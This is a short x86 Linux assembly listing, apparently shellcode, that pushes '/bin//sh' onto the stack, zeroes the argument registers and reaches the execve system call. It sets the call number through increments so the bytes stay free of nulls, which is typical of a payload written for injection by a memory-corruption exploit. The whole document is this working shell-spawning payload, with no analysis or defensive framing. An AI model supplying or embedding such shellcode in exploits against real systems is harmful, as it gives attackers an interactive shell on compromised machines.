section .text
global _start

_start:
    xor eax, eax
    push eax
    push 0x68732f2f
    push 0x6e69622f
    mov ebx, esp ; ebx = "/bin//sh"
    xor ecx, ecx
    xor edx, edx
    mov al, 0x8
    inc al
    inc al
    inc al
    int 0x80
    
